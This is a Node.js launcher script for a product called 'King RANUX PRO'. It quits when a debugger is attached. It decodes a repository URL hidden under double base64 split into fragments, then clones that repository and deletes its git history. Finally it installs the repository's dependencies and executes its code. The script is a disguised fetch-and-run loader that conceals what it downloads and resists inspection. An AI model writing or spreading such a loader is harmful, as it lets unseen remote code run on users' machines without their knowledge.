const { execSync } = require("child_process");
const fs = require("fs");
const path = require("path");

if (process.execArgv.join("").includes("inspect")) {
  console.log("Debug mode detected");
  process.exit(1);
}

function buildHiddenString() {
  const parts = [
    "YUhSMGNITTZMeTluYVhSaFltVnRaUzVqYjIwdl",
    "J4YnJpZGdlLWRldi9ueC1icmlkZ2UuZ2l0"
  ];
  return parts.join("");
}

const STEP1 = Buffer.from(buildHiddenString(), "base64").toString("utf-8");
const CORE_URL = Buffer.from(STEP1, "base64").toString("utf-8");

const CORE_DIR = path.join(__dirname, "core");

try {
  execSync("npm cache clean --force", { stdio: "inherit" });
} catch {}

if (fs.existsSync(CORE_DIR)) {
  try {
    fs.rmSync(CORE_DIR, { recursive: true, force: true });
  } catch {}
}

console.log("Downloading latest King RANUX PRO core...");

try {
  execSync(`git clone ${CORE_URL} core`, { stdio: "inherit" });
} catch (e) {
  console.log("Failed to download core");
  process.exit(1);
}

if (fs.existsSync(path.join(CORE_DIR, ".git"))) {
  try {
    fs.rmSync(path.join(CORE_DIR, ".git"), { recursive: true, force: true });
  } catch {}
}

if (!fs.existsSync(path.join(CORE_DIR, "node_modules"))) {
  try {
    execSync(`cd core && npm install`, { stdio: "inherit" });
  } catch (e) {
    console.log("Failed to install core dependencies");
    process.exit(1);
  }
}

const userConfigPath = path.join(__dirname, "config.js");

if (!fs.existsSync(userConfigPath)) {
  console.log("config.js not found");
  process.exit(1);
}

try {
  require("./core/index.js");
} catch (e) {
  console.log("Failed to start core");
}
